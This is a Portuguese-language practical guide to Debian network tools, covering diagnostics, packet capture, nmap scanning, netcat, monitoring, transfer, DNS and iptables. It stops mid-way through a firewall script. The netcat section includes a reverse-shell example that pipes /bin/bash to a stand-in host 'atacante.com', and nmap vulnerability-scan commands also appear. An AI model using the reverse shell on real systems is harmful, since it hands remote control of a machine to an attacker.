# Ferramentas de Rede no Debian - Guia Prático

## Índice
1. [Introdução](#introdução)
2. [Análise e Diagnóstico](#análise-e-diagnóstico)
3. [Captura de Pacotes](#captura-de-pacotes)
4. [Testes de Conectividade](#testes-de-conectividade)
5. [Scan e Discovery](#scan-e-discovery)
6. [Monitoramento de Rede](#monitoramento-de-rede)
7. [Transferência de Arquivos](#transferência-de-arquivos)
8. [Servidores de Rede](#servidores-de-rede)
9. [Segurança e Firewall](#segurança-e-firewall)
10. [Ferramentas DNS](#ferramentas-dns)
11. [Performance e Benchmark](#performance-e-benchmark)
12. [Utilitários Diversos](#utilitários-diversos)

---

## Introdução

Este documento apresenta as principais ferramentas de rede disponíveis no Debian Linux, com exemplos práticos e casos de uso reais para administração, diagnóstico e análise de redes.

### Instalação das Ferramentas

```bash
# Atualizar repositórios
sudo apt update

# Ferramentas básicas
sudo apt install -y net-tools iproute2 iputils-ping

# Ferramentas de diagnóstico
sudo apt install -y traceroute mtr-tiny dnsutils

# Análise de rede
sudo apt install -y tcpdump wireshark nmap netcat-openbsd

# Monitoramento
sudo apt install -y iftop nethogs iptraf-ng vnstat

# Performance
sudo apt install -y iperf3 speedtest-cli

# Utilitários
sudo apt install -y curl wget socat ngrep arp-scan
```

---

## Análise e Diagnóstico

### 1. ip - Ferramenta Moderna de Configuração de Rede

**Instalação**: `sudo apt install iproute2`

#### Casos de Uso

**Visualizar Interfaces**
```bash
# Listar todas as interfaces
ip link show

# Listar apenas interfaces ativas
ip link show up

# Formato compacto com cores
ip -c -br link show

# Detalhes de uma interface específica
ip -s -d link show eth0
```

**Gerenciar Endereços IP**
```bash
# Ver todos os IPs
ip addr show

# Ver IP de interface específica
ip addr show eth0

# Adicionar IP
sudo ip addr add 192.168.1.100/24 dev eth0

# Adicionar IP secundário
sudo ip addr add 192.168.1.101/24 dev eth0

# Remover IP
sudo ip addr del 192.168.1.100/24 dev eth0

# Flush todos os IPs
sudo ip addr flush dev eth0
```

**Gerenciar Rotas**
```bash
# Ver tabela de roteamento
ip route show

# Ver rota para destino específico
ip route get 8.8.8.8

# Adicionar rota padrão
sudo ip route add default via 192.168.1.1

# Adicionar rota específica
sudo ip route add 10.0.0.0/8 via 192.168.1.254

# Adicionar rota por interface
sudo ip route add 172.16.0.0/12 dev eth1

# Deletar rota
sudo ip route del 10.0.0.0/8

# Flush tabela de rotas
sudo ip route flush table main
```

**Caso Prático: Configurar Multi-homing**
```bash
#!/bin/bash
# Configurar servidor com duas conexões à Internet

# Interface 1 - Provedor A
sudo ip addr add 203.0.113.10/24 dev eth0
sudo ip route add default via 203.0.113.1 dev eth0 table 100
sudo ip rule add from 203.0.113.10 table 100

# Interface 2 - Provedor B
sudo ip addr add 198.51.100.10/24 dev eth1
sudo ip route add default via 198.51.100.1 dev eth1 table 101
sudo ip rule add from 198.51.100.10 table 101

# Balanceamento de carga
sudo ip route add default scope global \
    nexthop via 203.0.113.1 dev eth0 weight 1 \
    nexthop via 198.51.100.1 dev eth1 weight 1

echo "Multi-homing configurado!"
```

---

### 2. ss - Socket Statistics

**Instalação**: Incluído no `iproute2`

#### Casos de Uso

**Listar Conexões**
```bash
# Todas as conexões TCP
ss -ta

# Todas as conexões UDP
ss -ua

# Portas em listening
ss -tln

# Conexões estabelecidas
ss -tan state established

# Conexões por estado
ss -tan state time-wait
ss -tan state syn-sent
ss -tan state close-wait

# Mostrar processos
sudo ss -tlnp

# Estatísticas resumidas
ss -s
```

**Filtros Avançados**
```bash
# Conexões na porta 80
ss -tan '( dport = :80 or sport = :80 )'

# Conexões SSH
ss -tan '( dport = :22 or sport = :22 )'

# Conexões de um IP específico
ss -tan dst 192.168.1.100

# Conexões para rede específica
ss -tan dst 192.168.1.0/24

# Porta específica em listening
ss -tln sport = :8080
```

**Caso Prático: Monitorar Servidor Web**
```bash
#!/bin/bash
# Monitor de conexões do servidor web

echo "=== Conexões HTTP/HTTPS ==="
ss -tan '( dport = :80 or sport = :80 or dport = :443 or sport = :443 )' | wc -l

echo -e "\n=== Top 10 IPs Conectados ==="
ss -tan state established '( dport = :80 or dport = :443 )' | \
    awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -10

echo -e "\n=== Conexões por Estado ==="
ss -tan '( dport = :80 or dport = :443 )' | \
    awk 'NR>1 {print $1}' | sort | uniq -c

echo -e "\n=== Portas em Listening ==="
sudo ss -tlnp | grep -E ':80|:443'
```

---

### 3. ethtool - Diagnóstico de Interface Ethernet

**Instalação**: `sudo apt install ethtool`

#### Casos de Uso

**Informações da Interface**
```bash
# Status geral
sudo ethtool eth0

# Informações do driver
sudo ethtool -i eth0

# Estatísticas detalhadas
sudo ethtool -S eth0

# Recursos suportados
sudo ethtool -k eth0

# Configurações de energia
sudo ethtool --show-eee eth0
```

**Configuração de Velocidade**
```bash
# Configurar 1Gbps full-duplex
sudo ethtool -s eth0 speed 1000 duplex full autoneg off

# Habilitar autonegociação
sudo ethtool -s eth0 autoneg on

# Configurar 100Mbps
sudo ethtool -s eth0 speed 100 duplex full

# Ver resultado
sudo ethtool eth0 | grep -E "Speed|Duplex"
```

**Caso Prático: Diagnóstico de Problemas de Performance**
```bash
#!/bin/bash
# Diagnosticar problemas de rede

IFACE=$1

if [ -z "$IFACE" ]; then
    echo "Uso: $0 <interface>"
    exit 1
fi

echo "=== Diagnóstico de $IFACE ==="

echo -e "\n[1] Link Status"
sudo ethtool $IFACE | grep -E "Link detected|Speed|Duplex"

echo -e "\n[2] Erros de Interface"
sudo ethtool -S $IFACE | grep -iE "error|drop|collision|crc"

echo -e "\n[3] Configurações de Offload"
sudo ethtool -k $IFACE | grep ": on"

echo -e "\n[4] Ring Buffer"
sudo ethtool -g $IFACE

echo -e "\n[5] Driver Info"
sudo ethtool -i $IFACE

echo -e "\n[6] Estatísticas do Sistema"
ip -s link show $IFACE | grep -A2 -E "RX:|TX:"
```

---

## Captura de Pacotes

### 4. tcpdump - Captura de Pacotes em Linha de Comando

**Instalação**: `sudo apt install tcpdump`

#### Casos de Uso Básicos

**Captura Simples**
```bash
# Capturar em todas as interfaces
sudo tcpdump -i any

# Capturar em interface específica
sudo tcpdump -i eth0

# Salvar em arquivo
sudo tcpdump -i eth0 -w capture.pcap

# Ler arquivo capturado
tcpdump -r capture.pcap

# Captura com timestamp
sudo tcpdump -i eth0 -tttt
```

**Filtros Comuns**
```bash
# Apenas tráfego TCP
sudo tcpdump -i eth0 tcp

# Apenas tráfego UDP
sudo tcpdump -i eth0 udp

# Porta específica
sudo tcpdump -i eth0 port 80

# Host específico
sudo tcpdump -i eth0 host 192.168.1.100

# Rede específica
sudo tcpdump -i eth0 net 192.168.1.0/24

# Múltiplos filtros
sudo tcpdump -i eth0 'tcp and port 80'
```

**Filtros Avançados**
```bash
# Capturar apenas SYN packets
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'

# Capturar handshake TCP completo
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'

# Capturar apenas DNS queries
sudo tcpdump -i eth0 'udp port 53'

# HTTP GET requests
sudo tcpdump -i eth0 -A 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420)'

# Pacotes maiores que 1000 bytes
sudo tcpdump -i eth0 'greater 1000'

# ICMP echo request/reply
sudo tcpdump -i eth0 'icmp[icmptype] == icmp-echo or icmp[icmptype] == icmp-echoreply'
```

**Caso Prático: Capturar Tráfego HTTP**
```bash
#!/bin/bash
# Capturar e analisar tráfego HTTP

INTERFACE="eth0"
OUTPUT_FILE="http_traffic_$(date +%Y%m%d_%H%M%S).pcap"

echo "Capturando tráfego HTTP em $INTERFACE..."
echo "Pressione Ctrl+C para parar"

sudo tcpdump -i $INTERFACE -w $OUTPUT_FILE \
    '(tcp port 80 or tcp port 8080) and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)' &

TCPDUMP_PID=$!

# Esperar Ctrl+C
trap "sudo kill $TCPDUMP_PID; echo 'Captura finalizada'; exit" SIGINT SIGTERM

wait $TCPDUMP_PID

echo "Análise do arquivo capturado:"
tcpdump -r $OUTPUT_FILE -A | grep -E "GET|POST|Host:"
```

**Caso Prático: Detectar Port Scan**
```bash
#!/bin/bash
# Detectar tentativas de port scan

sudo tcpdump -i any -nn 'tcp[tcpflags] & tcp-syn != 0' | \
    awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn | \
    awk '$1 > 20 {print "Possível scan de: " $2 " (" $1 " tentativas)"}'
```

---

### 5. Wireshark/tshark - Análise Avançada de Pacotes

**Instalação**: `sudo apt install wireshark tshark`

#### Casos de Uso

**tshark - Versão CLI**
```bash
# Captura básica
sudo tshark -i eth0

# Captura com filtro de exibição
sudo tshark -i eth0 -Y "http.request"

# Salvar captura
sudo tshark -i eth0 -w capture.pcap

# Ler e filtrar arquivo
tshark -r capture.pcap -Y "tcp.port == 80"

# Estatísticas
tshark -r capture.pcap -q -z io,stat,1

# Conversações
tshark -r capture.pcap -q -z conv,tcp
```

**Filtros Úteis**
```bash
# Requisições HTTP
sudo tshark -i eth0 -Y "http.request.method == GET"

# Respostas HTTP com erro
sudo tshark -i eth0 -Y "http.response.code >= 400"

# Tráfego DNS
sudo tshark -i eth0 -Y "dns"

# SSL/TLS handshake
sudo tshark -i eth0 -Y "ssl.handshake"

# Pacotes retransmitidos
sudo tshark -i eth0 -Y "tcp.analysis.retransmission"

# Tráfego de IP específico
sudo tshark -i eth0 -Y "ip.addr == 192.168.1.100"
```

**Caso Prático: Análise de Performance Web**
```bash
#!/bin/bash
# Analisar tempo de resposta de aplicações web

CAPTURE_FILE="web_performance.pcap"

# Capturar 100 pacotes HTTP
sudo tshark -i eth0 -c 100 -w $CAPTURE_FILE \
    -f "tcp port 80 or tcp port 443"

echo "=== Análise de Performance ==="

# Tempo médio de resposta HTTP
tshark -r $CAPTURE_FILE -Y "http.response" \
    -T fields -e http.time | \
    awk '{sum+=$1; n++} END {if(n>0) print "Tempo médio de resposta: " sum/n " segundos"}'

# Códigos de status HTTP
echo -e "\n=== Códigos de Status HTTP ==="
tshark -r $CAPTURE_FILE -Y "http.response" \
    -T fields -e http.response.code | sort | uniq -c | sort -rn

# Top hosts acessados
echo -e "\n=== Top Hosts Acessados ==="
tshark -r $CAPTURE_FILE -Y "http.request" \
    -T fields -e http.host | sort | uniq -c | sort -rn | head -10

rm -f $CAPTURE_FILE
```

---

## Testes de Conectividade

### 6. ping - Teste ICMP

**Instalação**: `sudo apt install iputils-ping`

#### Casos de Uso

**Uso Básico**
```bash
# Ping padrão
ping google.com

# Número específico de pacotes
ping -c 4 8.8.8.8

# Intervalo entre pacotes (segundos)
ping -i 0.5 8.8.8.8

# Tamanho do pacote
ping -s 1000 8.8.8.8

# Timeout
ping -W 1 -c 3 192.168.1.1
```

**Testes Avançados**
```bash
# Flood ping (requer root)
sudo ping -f 192.168.1.1

# Ping com timestamp
ping -D 8.8.8.8

# Interface específica
ping -I eth0 192.168.1.1

# TTL específico
ping -t 5 8.8.8.8

# Não fragmentar (descobrir MTU)
ping -M do -s 1472 8.8.8.8

# Ping IPv6
ping6 2001:4860:4860::8888
```

**Caso Prático: Verificar MTU Path**
```bash
#!/bin/bash
# Descobrir MTU ideal para um destino

DEST=${1:-8.8.8.8}
START_SIZE=1500
MIN_SIZE=500

echo "Testando MTU para $DEST"

for size in $(seq $START_SIZE -50 $MIN_SIZE); do
    # Subtrair 28 bytes (20 IP + 8 ICMP)
    payload=$((size - 28))
    
    echo -n "Testando MTU $size... "
    
    if ping -M do -s $payload -c 1 -W 2 $DEST > /dev/null 2>&1; then
        echo "OK"
        echo "MTU ideal: $size bytes"
        break
    else
        echo "Falhou (fragmentação necessária)"
    fi
done
```

---

### 7. traceroute / mtr - Rastreamento de Rota

**Instalação**: `sudo apt install traceroute mtr-tiny`

#### Casos de Uso

**traceroute**
```bash
# Traceroute básico
traceroute google.com

# ICMP em vez de UDP
sudo traceroute -I google.com

# TCP SYN
sudo traceroute -T -p 80 google.com

# Número máximo de hops
traceroute -m 20 google.com

# Mostrar IPs sem resolver nomes
traceroute -n 8.8.8.8

# IPv6
traceroute6 2001:4860:4860::8888
```

**mtr - My Traceroute**
```bash
# Modo interativo
mtr google.com

# Modo relatório
mtr --report --report-cycles 10 google.com

# Formato simples
mtr -r -c 10 -n 8.8.8.8

# CSV output
mtr --csv --report-cycles 10 google.com > mtr_report.csv

# JSON output
mtr --json --report-cycles 10 google.com
```

**Caso Prático: Monitorar Latência Contínua**
```bash
#!/bin/bash
# Monitor contínuo de latência e perda de pacotes

DEST=${1:-8.8.8.8}
LOG_FILE="latency_$(date +%Y%m%d).log"

echo "Monitorando latência para $DEST"
echo "Log: $LOG_FILE"

while true; do
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
    
    # MTR report de 10 ciclos
    RESULT=$(mtr -r -c 10 -n $DEST | tail -1)
    
    echo "$TIMESTAMP | $RESULT" | tee -a $LOG_FILE
    
    sleep 60
done
```

---

## Scan e Discovery

### 8. nmap - Network Mapper

**Instalação**: `sudo apt install nmap`

#### Casos de Uso

**Discovery de Hosts**
```bash
# Ping scan (descobrir hosts ativos)
sudo nmap -sn 192.168.1.0/24

# ARP scan (rede local)
sudo nmap -PR 192.168.1.0/24

# Lista de hosts sem scan
nmap -sL 192.168.1.0/24
```

**Scan de Portas**
```bash
# Scan básico (1000 portas mais comuns)
nmap 192.168.1.100

# Todas as portas TCP
nmap -p- 192.168.1.100

# Portas específicas
nmap -p 22,80,443 192.168.1.100

# Range de portas
nmap -p 1-1000 192.168.1.100

# TCP Connect Scan
nmap -sT 192.168.1.100

# SYN Scan (stealth)
sudo nmap -sS 192.168.1.100

# UDP Scan
sudo nmap -sU 192.168.1.100

# Scan rápido (100 portas mais comuns)
nmap -F 192.168.1.100
```

**Detecção de Serviços e OS**
```bash
# Versão dos serviços
nmap -sV 192.168.1.100

# Detecção de OS
sudo nmap -O 192.168.1.100

# Detecção agressiva (OS, versão, scripts, traceroute)
sudo nmap -A 192.168.1.100

# Scripts NSE
nmap --script=default 192.168.1.100
```

**Scripts NSE Úteis**
```bash
# Vulnerabilidades
nmap --script vuln 192.168.1.100

# HTTP info
nmap --script http-enum 192.168.1.100 -p 80

# SSH info
nmap --script ssh2-enum-algos 192.168.1.100 -p 22

# SSL/TLS info
nmap --script ssl-enum-ciphers 192.168.1.100 -p 443

# SMB vulnerabilities
nmap --script smb-vuln* 192.168.1.100

# Listar scripts disponíveis
ls /usr/share/nmap/scripts/ | grep http
```

**Caso Prático: Scan Completo de Rede**
```bash
#!/bin/bash
# Scan completo de rede corporativa

NETWORK="192.168.1.0/24"
OUTPUT_DIR="scan_$(date +%Y%m%d_%H%M%S)"

mkdir -p $OUTPUT_DIR

echo "=== Iniciando Scan de $NETWORK ==="

# 1. Host Discovery
echo "[1/5] Descobrindo hosts ativos..."
sudo nmap -sn $NETWORK -oN $OUTPUT_DIR/hosts.txt

# 2. Port Scan nos hosts ativos
echo "[2/5] Scaneando portas..."
sudo nmap -iL $OUTPUT_DIR/hosts.txt -p- \
    -oN $OUTPUT_DIR/ports.txt

# 3. Service Detection
echo "[3/5] Detectando serviços..."
sudo nmap -iL $OUTPUT_DIR/hosts.txt -sV \
    -oN $OUTPUT_DIR/services.txt

# 4. OS Detection
echo "[4/5] Detectando sistemas operacionais..."
sudo nmap -iL $OUTPUT_DIR/hosts.txt -O \
    -oN $OUTPUT_DIR/os.txt

# 5. Vulnerability Scan
echo "[5/5] Scan de vulnerabilidades..."
sudo nmap -iL $OUTPUT_DIR/hosts.txt --script vuln \
    -oN $OUTPUT_DIR/vulns.txt

echo "Scan completo! Resultados em: $OUTPUT_DIR"
```

---

### 9. netcat (nc) - Swiss Army Knife

**Instalação**: `sudo apt install netcat-openbsd`

#### Casos de Uso

**Cliente/Servidor TCP**
```bash
# Servidor (escutar na porta 9999)
nc -l 9999

# Cliente (conectar)
nc localhost 9999

# Servidor com verbose
nc -lvp 9999

# Especificar IP para escutar
nc -l 192.168.1.100 9999
```

**Transferência de Arquivos**
```bash
# Receptor (servidor)
nc -l 9999 > arquivo_recebido.txt

# Sender (cliente)
nc 192.168.1.100 9999 < arquivo.txt

# Transferir diretório compactado
# Receptor
nc -l 9999 | tar xzvf -

# Sender
tar czf - /diretorio | nc 192.168.1.100 9999
```

**Port Scanning**
```bash
# Scan de porta única
nc -zv 192.168.1.100 22

# Scan de range de portas
nc -zv 192.168.1.100 20-80

# Scan UDP
nc -zuv 192.168.1.100 53

# Timeout
nc -zv -w 2 192.168.1.100 22
```

**Cliente de Protocolos**
```bash
# HTTP GET request
echo -e "GET / HTTP/1.0\r\nHost: example.com\r\n\r\n" | nc example.com 80

# Testar SMTP
nc smtp.gmail.com 25

# Testar POP3
nc pop.gmail.com 110

# Testar banner SSH
nc 192.168.1.100 22
```

**Caso Prático: Port Relay (Proxy TCP)**
```bash
#!/bin/bash
# Criar relay entre duas portas

LOCAL_PORT=8080
REMOTE_HOST="backend.local"
REMOTE_PORT=80

echo "Iniciando relay: localhost:$LOCAL_PORT -> $REMOTE_HOST:$REMOTE_PORT"

while true; do
    nc -l $LOCAL_PORT | nc $REMOTE_HOST $REMOTE_PORT
done
```

**Caso Prático: Reverse Shell**
```bash
# ATENÇÃO: Apenas para fins educacionais/testes autorizados

# Atacante (escutar)
nc -lvp 4444

# Vítima (conectar)
nc atacante.com 4444 -e /bin/bash

# Versão com named pipe (se -e não disponível)
# Vítima
mkfifo /tmp/pipe
/bin/bash -i < /tmp/pipe 2>&1 | nc atacante.com 4444 > /tmp/pipe
```

---

## Monitoramento de Rede

### 10. iftop - Monitor de Banda por Conexão

**Instalação**: `sudo apt install iftop`

#### Casos de Uso

```bash
# Monitor básico
sudo iftop

# Interface específica
sudo iftop -i eth0

# Mostrar portas
sudo iftop -P

# Não resolver hostnames (mais rápido)
sudo iftop -n

# Filtro (mesma sintaxe do tcpdump)
sudo iftop -f "port 80"

# Modo texto (não interativo)
sudo iftop -t -s 5

# Ver apenas tráfego de/para IP específico
sudo iftop -F 192.168.1.0/24
```

**Teclas Interativas**:
- `n` - Toggle DNS resolution
- `s` - Toggle source
- `d` - Toggle destination
- `t` - Toggle texto (cycle display modes)
- `p` - Toggle port display
- `l` - Display filter code
- `q` - Quit

---

### 11. nethogs - Monitor por Processo

**Instalação**: `sudo apt install nethogs`

#### Casos de Uso

```bash
# Monitor básico
sudo nethogs

# Interface específica
sudo nethogs eth0

# Múltiplas interfaces
sudo nethogs eth0 wlan0

# Delay de atualização (segundos)
sudo nethogs -d 2

# Trace mode (histórico)
sudo nethogs -t

# Mostrar apenas processos
sudo nethogs -c 5
```

---

### 12. vnstat - Estatísticas de Tráfego

**Instalação**: `sudo apt install vnstat`

#### Casos de Uso

```bash
# Configuração inicial
sudo systemctl enable vnstat
sudo systemctl start vnstat

# Ver estatísticas
vnstat

# Interface específica
vnstat -i eth0

# Estatísticas por hora
vnstat -h

# Estatísticas por dia
vnstat -d

# Estatísticas por mês
vnstat -m

# Live monitoring
vnstat -l

# Top 10 dias
vnstat --top10

# Output em JSON
vnstat --json

# Reset estatísticas
sudo vnstat -i eth0 --delete
sudo vnstat -i eth0 --create
```

**Caso Prático: Relatório Mensal de Consumo**
```bash
#!/bin/bash
# Gerar relatório de consumo de banda

OUTPUT_FILE="relatorio_banda_$(date +%Y%m).txt"

{
    echo "========================================="
    echo "   RELATÓRIO DE CONSUMO DE BANDA"
    echo "   Gerado em: $(date)"
    echo "========================================="
    
    for iface in $(ls /sys/class/net/ | grep -v lo); do
        echo -e "\n=== Interface: $iface ==="
        vnstat -i $iface -m
        echo ""
        vnstat -i $iface --top10
    done
} > $OUTPUT_FILE

echo "Relatório salvo em: $OUTPUT_FILE"
```

---

## Transferência de Arquivos

### 13. curl - Cliente HTTP/HTTPS

**Instalação**: `sudo apt install curl`

#### Casos de Uso

**GET Requests**
```bash
# GET básico
curl https://api.github.com

# Salvar em arquivo
curl -o output.html https://example.com
curl -O https://example.com/file.zip

# Seguir redirects
curl -L https://bit.ly/short-url

# Headers apenas
curl -I https://google.com

# Verbose (debug)
curl -v https://example.com

# Silent mode
curl -s https://api.example.com/data
```

**POST Requests**
```bash
# POST com dados
curl -X POST https://api.example.com/users \
    -H "Content-Type: application/json" \
    -d '{"name":"John","email":"john@example.com"}'

# POST de arquivo
curl -X POST https://api.example.com/upload \
    -F "file=@document.pdf"

# POST form data
curl -X POST https://example.com/form \
    -d "username=john&password=secret"
```

**Autenticação**
```bash
# Basic Auth
curl -u username:password https://api.example.com

# Bearer Token
curl -H "Authorization: Bearer TOKEN" https://api.example.com

# API Key
curl -H "X-API-Key: KEY" https://api.example.com
```

**Caso Prático: Monitorar API**
```bash
#!/bin/bash
# Monitorar disponibilidade e tempo de resposta de API

API_URL="https://api.example.com/health"
LOG_FILE="api_monitor.log"

while true; do
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Fazer request e medir tempo
    START=$(date +%s.%N)
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" $API_URL)
    END=$(date +%s.%N)
    
    RESPONSE_TIME=$(echo "$END - $START" | bc)
    
    if [ "$HTTP_CODE" -eq 200 ]; then
        STATUS="OK"
    else
        STATUS="FAIL"
    fi
    
    echo "$TIMESTAMP | Status: $STATUS | HTTP: $HTTP_CODE | Time: ${RESPONSE_TIME}s" | \
        tee -a $LOG_FILE
    
    sleep 60
done
```

---

### 14. wget - Download de Arquivos

**Instalação**: `sudo apt install wget`

#### Casos de Uso

```bash
# Download simples
wget https://example.com/file.zip

# Continuar download interrompido
wget -c https://example.com/large-file.iso

# Download em background
wget -b https://example.com/file.zip

# Limitar velocidade
wget --limit-rate=1m https://example.com/file.zip

# Download recursivo de site
wget -r -l 2 https://example.com

# Mirror de site
wget --mirror -p --convert-links -P ./site https://example.com

# Download com autenticação
wget --user=username --password=password https://example.com/file

# User-agent customizado
wget --user-agent="Mozilla/5.0" https://example.com
```

**Caso Prático: Backup de Site**
```bash
#!/bin/bash
# Fazer backup completo de um site

SITE_URL="https://example.com"
BACKUP_DIR="backup_$(date +%Y%m%d)"

echo "Iniciando backup de $SITE_URL"

wget --mirror \
     --page-requisites \
     --adjust-extension \
     --convert-links \
     --backup-converted \
     --no-parent \
     --wait=1 \
     --random-wait \
     --directory-prefix=$BACKUP_DIR \
     $SITE_URL

echo "Backup completo em: $BACKUP_DIR"

# Comprimir backup
tar czf ${BACKUP_DIR}.tar.gz $BACKUP_DIR
echo "Arquivo compactado: ${BACKUP_DIR}.tar.gz"
```

---

### 15. rsync - Sincronização de Arquivos

**Instalação**: `sudo apt install rsync`

#### Casos de Uso

```bash
# Cópia local
rsync -avh /origem/ /destino/

# Cópia remota via SSH
rsync -avz -e ssh /local/ user@remote:/remoto/

# Sync reverso
rsync -avz -e ssh user@remote:/remoto/ /local/

# Dry-run (simular)
rsync -avhn /origem/ /destino/

# Mostrar progresso
rsync -avh --progress /origem/ /destino/

# Deletar arquivos no destino que não existem na origem
rsync -avh --delete /origem/ /destino/

# Excluir arquivos/diretórios
rsync -avh --exclude='*.log' --exclude='tmp/' /origem/ /destino/

# Limitar largura de banda
rsync -avh --bwlimit=1000 /origem/ /destino/
```

**Caso Prático: Backup Incremental**
```bash
#!/bin/bash
# Sistema de backup incremental com rsync

SOURCE="/dados"
BACKUP_BASE="/backup"
CURRENT="$BACKUP_BASE/current"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="$BACKUP_BASE/backup_$TIMESTAMP"

# Criar backup com hard links para economizar espaço
if [ -d "$CURRENT" ]; then
    rsync -avh --delete --link-dest="$CURRENT" "$SOURCE/" "$BACKUP_DIR/"
else
    rsync -avh --delete "$SOURCE/" "$BACKUP_DIR/"
fi

# Atualizar link para backup atual
rm -f "$CURRENT"
ln -s "$BACKUP_DIR" "$CURRENT"

echo "Backup completo: $BACKUP_DIR"

# Remover backups antigos (manter últimos 7)
ls -t "$BACKUP_BASE" | grep "^backup_" | tail -n +8 | \
    while read old_backup; do
        rm -rf "$BACKUP_BASE/$old_backup"
        echo "Removido backup antigo: $old_backup"
    done
```

---

## Ferramentas DNS

### 16. dig - DNS Lookup

**Instalação**: `sudo apt install dnsutils`

#### Casos de Uso

```bash
# Query básico
dig example.com

# Tipo de registro específico
dig example.com A
dig example.com AAAA
dig example.com MX
dig example.com NS
dig example.com TXT
dig example.com SOA

# Servidor DNS específico
dig @8.8.8.8 example.com
dig @1.1.1.1 example.com

# Resposta curta
dig +short example.com

# Trace completo (root até resposta)
dig +trace example.com

# Reverse DNS
dig -x 8.8.8.8

# Múltiplas queries
dig example.com A example.com MX

# Formato específico
dig +noall +answer example.com

# ANY (todos os registros)
dig example.com ANY
```

**Caso Prático: Verificar Propagação DNS**
```bash
#!/bin/bash
# Verificar propagação de DNS em múltiplos servidores

DOMAIN=$1

if [ -z "$DOMAIN" ]; then
    echo "Uso: $0 <dominio>"
    exit 1
fi

# Lista de servidores DNS públicos
DNS_SERVERS=(
    "8.8.8.8|Google"
    "8.8.4.4|Google Secondary"
    "1.1.1.1|Cloudflare"
    "1.0.0.1|Cloudflare Secondary"
    "208.67.222.222|OpenDNS"
    "208.67.220.220|OpenDNS Secondary"
    "9.9.9.9|Quad9"
    "149.112.112.112|Quad9 Secondary"
)

echo "Verificando propagação de DNS para: $DOMAIN"
echo "=========================================="

for entry in "${DNS_SERVERS[@]}"; do
    SERVER=$(echo $entry | cut -d'|' -f1)
    NAME=$(echo $entry | cut -d'|' -f2)
    
    IP=$(dig @$SERVER +short $DOMAIN A | tail -1)
    
    printf "%-25s %-15s %s\n" "$NAME" "($SERVER)" "$IP"
done
```

---

## Performance e Benchmark

### 17. iperf3 - Teste de Throughput

**Instalação**: `sudo apt install iperf3`

#### Casos de Uso

**Teste TCP**
```bash
# Servidor
iperf3 -s

# Cliente (teste de 30 segundos)
iperf3 -c 192.168.1.100 -t 30

# Múltiplas conexões paralelas
iperf3 -c 192.168.1.100 -P 10

# Teste reverso (servidor envia)
iperf3 -c 192.168.1.100 -R

# Teste bidirecional
iperf3 -c 192.168.1.100 --bidir

# Formato JSON
iperf3 -c 192.168.1.100 -J > results.json

# Intervalo de relatório
iperf3 -c 192.168.1.100 -i 1
```

**Teste UDP**
```bash
# Cliente UDP (100 Mbps)
iperf3 -c 192.168.1.100 -u -b 100M

# Cliente UDP (1 Gbps)
iperf3 -c 192.168.1.100 -u -b 1000M

# Ver perda de pacotes
iperf3 -c 192.168.1.100 -u -b 100M -t 60
```

**Caso Prático: Teste de Performance de Rede**
```bash
#!/bin/bash
# Script automatizado de teste de performance

SERVER=$1

if [ -z "$SERVER" ]; then
    echo "Uso: $0 <servidor_iperf>"
    exit 1
fi

REPORT_FILE="performance_$(date +%Y%m%d_%H%M%S).txt"

{
    echo "========================================="
    echo "   TESTE DE PERFORMANCE DE REDE"
    echo "   Servidor: $SERVER"
    echo "   Data: $(date)"
    echo "========================================="
    
    echo -e "\n[1] TCP - Single Stream"
    iperf3 -c $SERVER -t 10
    
    echo -e "\n[2] TCP - 10 Parallel Streams"
    iperf3 -c $SERVER -P 10 -t 10
    
    echo -e "\n[3] TCP - Reverse"
    iperf3 -c $SERVER -R -t 10
    
    echo -e "\n[4] UDP - 100 Mbps"
    iperf3 -c $SERVER -u -b 100M -t 10
    
    echo -e "\n[5] UDP - 1 Gbps"
    iperf3 -c $SERVER -u -b 1000M -t 10
    
} | tee $REPORT_FILE

echo "Relatório salvo em: $REPORT_FILE"
```

---

### 18. speedtest-cli - Teste de Velocidade Internet

**Instalação**: `sudo apt install speedtest-cli`

#### Casos de Uso

```bash
# Teste básico
speedtest-cli

# Formato simples
speedtest-cli --simple

# Lista de servidores
speedtest-cli --list

# Servidor específico
speedtest-cli --server 12345

# Output em JSON
speedtest-cli --json

# Compartilhar resultado
speedtest-cli --share

# Bytes em vez de bits
speedtest-cli --bytes
```

**Caso Prático: Monitorar Velocidade da Internet**
```bash
#!/bin/bash
# Monitorar velocidade da internet periodicamente

LOG_FILE="speedtest_$(date +%Y%m).log"

echo "Iniciando monitoramento de velocidade"
echo "Log: $LOG_FILE"

while true; do
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo "[$TIMESTAMP] Executando teste..."
    
    # Executar speedtest e extrair resultados
    RESULT=$(speedtest-cli --simple)
    
    echo "$TIMESTAMP | $RESULT" | tee -a $LOG_FILE
    
    # Esperar 1 hora
    sleep 3600
done
```

---

## Segurança e Firewall

### 19. iptables - Firewall do Linux

**Instalação**: Já incluído no kernel

#### Casos de Uso

**Ver Regras**
```bash
# Listar todas as regras
sudo iptables -L -n -v

# Listar com números de linha
sudo iptables -L --line-numbers

# Listar tabela NAT
sudo iptables -t nat -L -n -v

# Listar tabela MANGLE
sudo iptables -t mangle -L -n -v
```

**Regras Básicas**
```bash
# Permitir SSH
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Permitir HTTP e HTTPS
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Permitir ping
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT

# Bloquear IP específico
sudo iptables -A INPUT -s 192.168.1.50 -j DROP

# Bloquear porta
sudo iptables -A INPUT -p tcp --dport 23 -j DROP
```

**Caso Prático: Firewall Básico para Servidor Web**
```bash
#!/bin/bash
# Configurar firewall básico para servidor web

# Limpar regras existentes
sudo iptables -F
sudo iptables -X

# Política padrão: DROP
